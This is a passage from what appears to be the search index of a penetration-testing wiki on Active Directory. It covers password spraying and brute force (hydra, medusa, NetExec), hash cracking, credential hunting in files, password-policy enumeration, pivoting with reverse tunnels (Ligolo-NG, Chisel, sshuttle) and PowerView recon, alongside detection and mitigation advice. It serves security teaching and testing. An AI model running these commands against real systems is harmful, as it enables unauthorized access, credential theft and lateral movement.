PowerView\nImport-Module powerview.ps1\nGet-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n\n# Export to CSV for offline analysis\nGet-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null} | Export-Csv -NoTypeInformation user_descriptions.csv\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#passwords-in-files","title":"Passwords in Files","text":"<p>Search for passwords stored in configuration files, scripts, and documentation.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#windows","title":"Windows","text":"<pre><code># Search for password in common file types\nfindstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n\n# Search for specific patterns\nfindstr /SIM /C:\"password=\" *.config *.xml\nfindstr /SIM /C:\"pwd\" *.ps1 *.bat\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#linux","title":"Linux","text":"<pre><code># Search for password in common file types\ngrep -r -i \"password\" /etc/ 2&gt;/dev/null\ngrep -r -i \"pwd\" /home/ 2&gt;/dev/null\nfind / -name \"*.conf\" -exec grep -l \"password\" {} \\; 2&gt;/dev/null\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#brute-force-attacks","title":"Brute Force Attacks","text":"<p>Brute force attacks involve trying many possible passwords against one or more accounts.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#online-brute-force","title":"Online Brute Force","text":"<pre><code># Using Hydra against SSH\nhydra -l admin -P passwords.txt ssh://192.168.1.10\n\n# Using Medusa against RDP\nmedusa -h 192.168.1.10 -u admin -P passwords.txt -M rdp\n\n# Using NetExec against SMB\nnxc smb 192.168.1.10 -u admin -P passwords.txt --continue-on-success\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#offline-brute-force","title":"Offline Brute Force","text":"<pre><code># Using Hashcat against NTLM hashes\nhashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt\n\n# Using John the Ripper\njohn --format=NT --wordlist=wordlist.txt ntlm_hashes.txt\n\n# Using Hashcat with rules\nhashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#credential-stuffing","title":"Credential Stuffing","text":"<p>Credential stuffing involves using previously breached username/password pairs against different services.</p> <pre><code># Using NetExec with credential pairs\nnxc smb 192.168.1.0/24 -u credentials.txt -p credentials.txt --continue-on-success\n\n# Using credential stuffing with Burp Suite\n# Load credentials list and configure Intruder to test against login forms\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#detection","title":"Detection","text":"<ul> <li>Monitor for multiple failed login attempts from the same source</li> <li>Watch for authentication attempts against multiple accounts with the same password</li> <li>Track unusual login patterns (time of day, source IP)</li> <li>Monitor for password spraying tools and techniques</li> <li>Analyze authentication logs for patterns consistent with attacks</li> </ul>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#mitigation","title":"Mitigation","text":"<ul> <li>Implement strong password policies</li> <li>Use multi-factor authentication (MFA)</li> <li>Implement account lockout policies</li> <li>Deploy anomaly detection for authentication</li> <li>Use password filtering solutions</li> <li>Implement just-in-time (JIT) access</li> <li>Regularly educate users on password security</li> <li>Monitor for credential exposure in code repositories and documentation</li> </ul>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_policy_enumeration/","title":"Password policy enumeration","text":"","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#technique","title":"Technique","text":"<p>Password Policy Enumeration is a reconnaissance technique used to discover the password requirements and account lockout settings enforced in an Active Directory domain. This information helps attackers craft more effective password attacks by understanding complexity requirements, lockout thresholds, and reset timers.</p>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#prerequisites","title":"Prerequisites","text":"<p>From Windows: Domain-joined machine or network access to domain controller.</p> <p>From Linux: Network access to domain controller with valid credentials or null session capability.</p>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#execution","title":"Execution","text":"","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#from-windows","title":"From Windows","text":"","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#command-line","title":"Command Line","text":"<pre><code># View domain password policy\nnet accounts /domain\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#powershell","title":"PowerShell","text":"<pre><code># Using native PowerShell\n(Get-ADDefaultDomainPasswordPolicy).MinPasswordLength\n(Get-ADDefaultDomainPasswordPolicy).LockoutThreshold\n(Get-ADDefaultDomainPasswordPolicy) | Format-List\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#powerview","title":"PowerView","text":"<pre><code># Import PowerView\nImport-Module .\\PowerView.ps1\n\n# Get domain password policy\nGet-DomainPolicy\n\n# View the details\n(Get-DomainPolicy).\"System Access\"\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#from-linux","title":"From Linux","text":"","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#netexec-formerly-crackmapexec","title":"NetExec (formerly CrackMapExec)","text":"<pre><code># With valid credentials\nnxc smb 192.168.1.10 -u username -p password --pass-pol\n\n# With null session (if allowed)\nnxc smb 192.168.1.10 -u '' -p '' --pass-pol\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#rpcclient","title":"RPCClient","text":"<pre><code># Connect with null session (if allowed)\nrpcclient -U \"\" -N 192.168.1.10\n\n# Connect with credentials\nrpcclient -U \"domain/username%password\" 192.168.1.10\n\n# Query domain information\nrpcclient $&gt; querydominfo\n\n# Get password policy\nrpcclient $&gt; getdompwinfo\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#enum4linux","title":"Enum4Linux","text":"<pre><code># Query password policy specifically\nenum4linux -P 192.168.1.10\n\n# Full enumeration including password policy\nenum4linux -a 192.168.1.10\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#ldap-tools","title":"LDAP Tools","text":"<pre><code># Using ldeep\nldeep ldap -u 'username' -p 'password' -d 'domain.local' -s 192.168.1.10 domain_policy\n\n# Using ldapsearch\nldapsearch -x -h 192.168.1.10 -D \"domain\\\\username\" -w \"password\" -b \"DC=domain,DC=local\" \"(objectClass=domainDNS)\" | grep -i pwdproperties\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#impacket","title":"Impacket","text":"<pre><code># Using impacket-GetADPolicyInfo\nimpacket-GetADPolicyInfo -dc-ip 192.168.1.10 'domain/username:password'\n</code></pre>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#considerations","title":"Considerations","text":"<p>Important Policy Settings - Minimum password length - Password complexity requirements - Password history count - Maximum password age - Account lockout threshold - Account lockout duration - Account lockout observation window</p> <p>OPSEC - Most of these techniques generate minimal logs as they use standard protocols and queries - RPCClient and LDAP queries appear as normal directory service activity - Windows command line tools generate standard user activity logs</p>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/password_policy_enumeration/#detection-mitigation","title":"Detection &amp; Mitigation","text":"<p>Detection - Monitor for multiple policy queries from the same source in a short time - Watch for non-admin accounts querying domain policies - Look for policy queries from non-domain-joined machines</p> <p>Mitigation - Restrict null sessions - Implement proper access controls for domain policy information - Use dedicated admin workstations for policy management - Audit and monitor access to domain controllers</p>","tags":["type/technique","tactic/reconnaissance","technique/password-policy","service/active-directory","os/windows","os/linux","tool/nxc","tool/rpcclient","tool/enum4linux","tool/powerview"]},{"location":"Active%20Directory/flat/pivoting/","title":"Pivoting","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#technique","title":"Technique","text":"<p>Pivoting is a technique used to access otherwise unreachable networks by routing traffic through a compromised host. This method allows attackers to move laterally through segmented networks, access resources on internal subnets, and evade network security controls like firewalls.</p> <p>The pivoting host (sometimes called a \"jump box\") acts as a bridge between the attacker and target networks, allowing traffic to flow between networks that wouldn't normally be able to communicate directly.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - Command execution on the pivot host - Ability to transfer and run tools on the pivot host - Network connectivity between the attacker, pivot host, and target network</p> <p>System State: - Pivot host must have access to both the attacker's network and the target network - Appropriate tools must be available or transferable to the pivot host</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#pivoting-with-ligolo-ng","title":"Pivoting with Ligolo-NG","text":"<p>Ligolo-NG is a powerful, cross-platform tunneling tool designed for secure pivoting during penetration tests.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#single-pivot-setup","title":"Single Pivot Setup","text":"<p>On Attack Host:</p> <ol> <li> <p>Set up TUN interface: <pre><code>sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n</code></pre></p> </li> <li> <p>Start the proxy server: <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre></p> </li> <li> <p>Add route to the target subnet: <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\n</code></pre></p> </li> </ol> <p>On Target (Pivot) Host:</p> <ol> <li>Run the agent to connect back to the attack host: <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre></li> </ol> <p>Back on Attack Host:</p> <ol> <li> <p>Select the session: <pre><code>session\n</code></pre></p> </li> <li> <p>Add port forwards to access services: <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\n</code></pre></p> </li> <li> <p>Start the tunnel: <pre><code>start\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#double-pivot-setup","title":"Double Pivot Setup","text":"<p>For accessing networks beyond the first pivot host:</p> <p>On Attack Host:</p> <ol> <li> <p>Set up TUN interfaces for both pivots: <pre><code>sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\nsudo ip tuntap add user kali mode tun double ; sudo ip link set double up\n</code></pre></p> </li> <li> <p>Start the proxy server: <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre></p> </li> <li> <p>Add routes to both target subnets: <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\nsudo ip route add 172.16.210.0/24 dev double\n</code></pre></p> </li> </ol> <p>First Pivot Host:</p> <ol> <li>Connect back to attack host: <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre></li> </ol> <p>On Attack Host:</p> <ol> <li> <p>Select the session: <pre><code>session\n</code></pre></p> </li> <li> <p>Add listener for second pivot: <pre><code>listener_add --addr 0.0.0.0:139 --to 127.0.0.1:443\n</code></pre></p> </li> <li> <p>Add standard port forwards: <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\n</code></pre></p> </li> <li> <p>Start first tunnel: <pre><code>start\n</code></pre></p> </li> </ol> <p>Second Pivot Host:</p> <ol> <li>Connect to first pivot host: <pre><code>agent.exe -connect &lt;firstPivotIP&gt;:139 -ignore-cert\n</code></pre></li> </ol> <p>Back on Attack Host:</p> <ol> <li>Switch to second pivot session</li> <li> <p>Add port forwards for second pivot: <pre><code>listener_add --addr 0.0.0.0:5050 --to 127.0.0.1:50\nlistener_add --addr 0.0.0.0:5051 --to 127.0.0.1:51\n</code></pre></p> </li> <li> <p>Start second tunnel with specific TUN device: <pre><code>start --tun double\n</code></pre></p> </li> </ol> <p>Verify access to both networks: <pre><code>nxc smb 172.16.139.0/24\nnxc smb 172.16.210.0/24\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#ssh-based-pivoting","title":"SSH-Based Pivoting","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#proxychains-with-ssh-dynamic-port-forwarding","title":"Proxychains with SSH Dynamic Port Forwarding","text":"<ol> <li> <p>Create a SOCKS proxy using SSH: <pre><code>ssh -D 9050 user@&lt;jumpIP&gt;\n</code></pre></p> </li> <li> <p>Verify proxychains configuration in <code>/etc/proxychains.conf</code> or <code>/etc/proxychains4.conf</code>: <pre><code>socks4  127.0.0.1 9050\n</code></pre></p> </li> <li> <p>Use proxychains to route tools through the tunnel: <pre><code>proxychains nmap -v -Pn -sT &lt;internalIP&gt;\nproxychains firefox\nproxychains impacket-smbclient internal.domain.local/user:pass@internalserver\n</code></pre></p> </li> </ol> <p>Note: Proxychains can only perform full TCP connect scans (<code>-sT</code>) as it doesn't handle partial packets correctly.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#sshuttle-transparent-proxy","title":"SSHuttle (Transparent Proxy)","text":"<p>SSHuttle is a transparent proxy that routes traffic through an SSH connection without requiring proxychains:</p> <pre><code>sudo sshuttle -r user@&lt;jumpHost&gt; 172.16.5.0/23 -v\n</code></pre> <p>This creates iptables rules to transparently redirect all traffic to the specified subnet through the SSH tunnel, allowing direct use of tools:</p> <pre><code>nmap -v -sV 172.16.5.19 -A -Pn\nfirefox http://172.16.5.19\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#other-pivoting-techniques","title":"Other Pivoting Techniques","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#metasploits-routing-and-port-forwarding","title":"Metasploit's Routing and Port Forwarding","text":"<p>After getting a Meterpreter session:</p> <pre><code># Add route through compromised host\nmeterpreter &gt; run autoroute -s 192.168.1.0/24\n\n# Or from msfconsole\nmsf &gt; route add 192.168.1.0/24 &lt;session_id&gt;\n\n# Create a SOCKS proxy\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; set SRVPORT 9050\nmsf &gt; set VERSION 4a\nmsf &gt; run\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#chisel-cross-platform-tcpudp-tunnel","title":"Chisel (Cross-Platform TCP/UDP Tunnel)","text":"<ol> <li> <p>On attack host: <pre><code>./chisel server -p 8080 --reverse\n</code></pre></p> </li> <li> <p>On pivot host: <pre><code>./chisel client &lt;attackIP&gt;:8080 R:socks\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#detection","title":"Detection","text":"<ul> <li>Monitor for unusual outbound connections, especially over non-standard ports</li> <li>Look for unexpected listening ports on internal systems</li> <li>Detect SSH connections with dynamic port forwarding (-D option)</li> <li>Watch for network traffic patterns inconsistent with normal business functions</li> <li>Monitor for the presence of tunneling tools (Ligolo, Chisel, etc.)</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/pivoting/#mitigation","title":"Mitigation","text":"<ul> <li>Implement proper network segmentation with restrictive ACLs</li> <li>Use application-layer inspection to identify tunneled traffic</li> <li>Deploy an internal proxy for outbound web traffic</li> <li>Monitor and restrict outbound connections to the internet</li> <li>Implement jump servers with detailed logging for administrative access</li> <li>Use host-based firewalls to restrict unnecessary connections</li> <li>Deploy network traffic analysis tools to identify anomalous traffic patterns</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1572","#stage/lateral-movement","#tool/ligolo-ng","#tool/proxychains","#tool/sshuttle","#os/linux","#os/windows","#networking"]},{"location":"Active%20Directory/flat/powerview/","title":"Powerview","text":"","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#powerview-overview","title":"PowerView Overview","text":"<p>PowerView is a PowerShell tool part of the PowerSploit framework that provides advanced Active Directory enumeration and exploitation capabilities. It allows attackers and penetration testers to gather detailed information about an Active Directory environment using PowerShell.</p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#basic-usage","title":"Basic Usage","text":"","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#loading-and-help","title":"Loading and Help","text":"<p>Load PowerView into the current session: <pre><code>Import-Module .\\PowerView.ps1\n</code></pre></p> <p>Show detailed help for a function: <pre><code>Get-Help Get-DomainUser -Detailed\n</code></pre></p> <p>Build an alternate credential object for any PowerView function: <pre><code>$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a',$SecPassword)\n</code></pre></p> <p>Test using alternate creds with a domain query: <pre><code>Get-DomainUser -Credential $Cred\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#domain-enumeration","title":"Domain Enumeration","text":"","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#domain-information","title":"Domain Information","text":"<p>Query info about the current domain: <pre><code>Get-Domain\n</code></pre></p> <p>Query info about a specified (child) domain: <pre><code>Get-Domain -Domain child.corp.local\n</code></pre></p> <p>List domain controllers for the current domain: <pre><code>Get-DomainController\n</code></pre></p> <p>Get forest-level information: <pre><code>Get-Forest\n</code></pre></p> <p>List all domains in the forest: <pre><code>Get-ForestDomain\n</code></pre></p> <p>List forest trusts: <pre><code>Get-ForestTrust\n</code></pre></p> <p>List domain trusts (like nltest /trusted_domains): <pre><code>Get-DomainTrust\n</code></pre></p> <p>Recursively map reachable domain trusts: <pre><code>Get-DomainTrustMapping\n</code></pre></p> <p>Enumerate AD sites: <pre><code>Get-DomainSite\n</code></pre></p> <p>Enumerate AD subnets: <pre><code>Get-DomainSubnet\n</code></pre></p> <p>List global catalog servers in the forest: <pre><code>Get-ForestGlobalCatalog\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#policy-information","title":"Policy Information","text":"<p>Read Kerberos policy from domain policy: <pre><code>(Get-DomainPolicy -Domain corp.local).KerberosPolicy\n</code></pre></p> <p>Read password/lockout policy (SystemAccess) from domain policy: <pre><code>(Get-DomainPolicy -Domain corp.local).SystemAccess\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#user-enumeration","title":"User Enumeration","text":"<p>Enumerate users with useful props (UPN, enabled, last logon): <pre><code>Get-DomainUser -Properties samaccountname,UserPrincipalName,Enabled,lastlogontimestamp\n</code></pre></p> <p>Users with passwords not changed in &gt;1 year: <pre><code>$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter \"(pwdlastset&lt;=$Date)\" -Properties samaccountname,pwdlastset\n</code></pre></p> <p>All enabled users (DNs): <pre><code>Get-DomainUser -LDAPFilter \"(!userAccountControl:1.2.840.113556.1.4.803:=2)\" -Properties distinguishedname\n</code></pre></p> <p>Enabled users via UAC helper: <pre><code>Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname\n</code></pre></p> <p>All disabled users (LDAP filter): <pre><code>Get-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=2)\"\n</code></pre></p> <p>All disabled users (UAC helper): <pre><code>Get-DomainUser -UACFilter ACCOUNTDISABLE\n</code></pre></p> <p>Users requiring smart card auth (LDAP filter): <pre><code>Get-DomainUser -LDAPFilter \"(useraccountcontrol:1.2.840.113556.1.4.803:=262144)\"\n</code></pre></p> <p>Users requiring smart card (UAC helper): <pre><code>Get-DomainUser -UACFilter SMARTCARD_REQUIRED\n</code></pre></p> <p>Users NOT requiring smart card (list samaccountname only): <pre><code>Get-DomainUser -LDAPFilter \"(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)\" -Properties samaccountname\n</code></pre></p> <p>Service accounts (users with SPNs): <pre><code>Get-DomainUser -SPN\n</code></pre></p> <p>AS-REP roastable users (no Kerberos preauth): <pre><code>Get-DomainUser -PreauthNotRequired\n</code></pre></p> <p>AS-REP roastable via UAC helper: <pre><code>Get-DomainUser -UACFilter DONT_REQ_PREAUTH\n</code></pre></p> <p>Mix identity types (SID, DN, GUID, name) for user lookup: <pre><code>'S-1-5-21-890171859-3433809279-3366196753-1114','CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff\n</code></pre></p> <p>Users with sidHistory populated: <pre><code>Get-DomainUser -LDAPFilter '(sidHistory=*)' -Properties samaccountname,sidHistory\n</code></pre></p> <p>Service accounts that are (or were) in Domain Admins: <pre><code>Get-DomainUser -SPN | ? {$_.memberOf -match 'Domain Admins'}\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#group-enumeration","title":"Group Enumeration","text":"<p>List groups with \"admin\" in the name: <pre><code>Get-DomainGroup -Identity *admin* -Properties name,distinguishedname\n</code></pre></p> <p>List protected (AdminSDHolder) groups: <pre><code>Get-DomainGroup -AdminCount -Properties name\n</code></pre></p> <p>List groups that don't have a global scope: <pre><code>Get-DomainGroup -GroupScope NotGlobal -Properties name\n</code></pre></p> <p>List all groups a user/group effectively belongs to (tokenGroups): <pre><code>Get-DomainGroup -MemberIdentity jdoe\n</code></pre></p> <p>Same as above with a DN identity: <pre><code>Get-DomainGroup -MemberIdentity \"CN=dfm,CN=Users,DC=testlab,DC=local\"\n</code></pre></p> <p>Recursively enumerate group members of Domain Admins: <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre></p>","tags":["#type/cheatsheet","#tool/powerview","#os/windows","#tactic/TA0007","#stage/enumeration","#stage/reconnaissance","#protocol/smb","#protocol/ldap","#protocol/kerberos"]},{"location":"Active%20Directory/flat/powerview/#foreign-entity-enumeration","title":"Foreign Entity 